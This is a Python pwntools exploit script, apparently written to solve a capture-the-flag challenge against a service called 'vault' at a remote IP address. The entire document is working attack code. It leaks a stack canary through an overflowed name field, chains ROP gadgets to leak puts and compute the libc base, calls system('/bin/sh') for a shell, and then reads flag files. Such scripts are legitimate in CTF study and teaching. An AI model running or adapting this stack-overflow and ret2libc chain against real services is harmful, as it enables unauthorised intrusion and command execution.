from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

PUTS_OFF = 0x82060
SYSTEM_OFF = 0x54790
BINSH_OFF = 0x1aaea4

LOCAL_MODE = '--local' in sys.argv

# Combos: (name, POP, RET, PLT, GOT, LOOP)
COMBOS = [
    ("A_local_gadgets_localplt", 0x401205, 0x401208, 0x401030, 0x403fc8, 0x401301),
    ("B_shift_gadgets_localplt", 0x4012cd, 0x4012d0, 0x401030, 0x403fc8, 0x4013c9),
]

if not LOCAL_MODE:
    COMBOS = [
        ("A_local_gadgets_localplt", 0x401205, 0x401208, 0x401030, 0x403fc8, 0x4013c9),
        ("B_shift_gadgets_localplt", 0x4012cd, 0x4012d0, 0x401030, 0x403fc8, 0x4013c9),
        ("C_local_pop_shiftplt",     0x401205, 0x401208, 0x4010f8, 0x403fc8, 0x4013c9),
        ("D_local_pop_shiftgot",     0x401205, 0x401208, 0x401030, 0x404090, 0x4013c9),
        ("E_all_shift",              0x4012cd, 0x4012d0, 0x4010f8, 0x404090, 0x4013c9),
    ]


def leak_canary_round(io):
    io.recvuntil(b'Enter your name: ')
    io.send(b'A' * 73)
    io.recvuntil(b'Hello, ' + b'A' * 73)
    leak = io.recvuntil(b'\nLeave a message', drop=True)
    if len(leak) < 7:
        raise ValueError(f'short leak {len(leak)}')
    canary = b'\x00' + leak[:7]
    rbp = (leak[7:13] + b'\x00' * 8)[:8]
    io.recvuntil(b'vault keeper: ')
    return canary, rbp


def attempt(name, pop, ret, plt, got, loop):
    if LOCAL_MODE:
        io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './vault'])
    else:
        io = remote('169.58.126.107', 5000, timeout=10)
    try:
        canary, rbp = leak_canary_round(io)
        payload1 = b'A' * 72 + canary + rbp + p64(pop) + p64(got) + p64(ret) + p64(plt) + p64(loop)
        io.send(payload1)
        io.recvuntil(b'Message received.\n', timeout=5)
        raw = io.recvuntil(b'Enter your name: ', timeout=5)
        if b'\n' not in raw:
            print(f'[{name}] no leak, raw={raw!r}')
            io.close()
            return None
        leaked, _ = raw.split(b'\n', 1)
        puts_leak = u64(leaked.ljust(8, b'\x00'))
        print(f'[{name}] puts leak = {hex(puts_leak)}')
        if (puts_leak & 0xfff) != (PUTS_OFF & 0xfff):
            print(f'[{name}] page offset mismatch (expect ...{hex(PUTS_OFF & 0xfff)}), maybe wrong combo')
        base = puts_leak - PUTS_OFF
        system = base + SYSTEM_OFF
        binsh = base + BINSH_OFF
        print(f'[{name}] libc base = {hex(base)}')
        # round 2 -> shell
        io.send(b'A' * 73)
        io.recvuntil(b'Hello, ' + b'A' * 73)
        leak2 = io.recvuntil(b'\nLeave a message', drop=True)
        if len(leak2) < 7:
            print(f'[{name}] short canary round2')
            io.close()
            return None
        canary2 = b'\x00' + leak2[:7]
        rbp2 = (leak2[7:13] + b'\x00' * 8)[:8]
        io.recvuntil(b'vault keeper: ')
        payload2 = b'A' * 72 + canary2 + rbp2 + p64(ret) + p64(pop) + p64(binsh) + p64(system)
        io.send(payload2)
        io.recvuntil(b'Message received.\n', timeout=5)
        io.send(b'echo SHELL_OK; cat /flag /flag.txt /root/flag /home/*/flag* 2>/dev/null; ls /; echo ENDFLAG\n')
        out = io.recvall(timeout=6)
        print(f'[{name}] shell output:\n{out.decode(errors="replace")}')
        io.close()
        return out
    except Exception as e:
        print(f'[{name}] FAIL: {type(e).__name__}: {e}')
        try:
            io.close()
        except Exception:
            pass
        return None


for combo in COMBOS:
    out = attempt(*combo)
    if out and (b'SHELL_OK' in out or b'flag{' in out or b'FLAG' in out or b'ctf{' in out):
        print('GOT IT via', combo[0])
        break
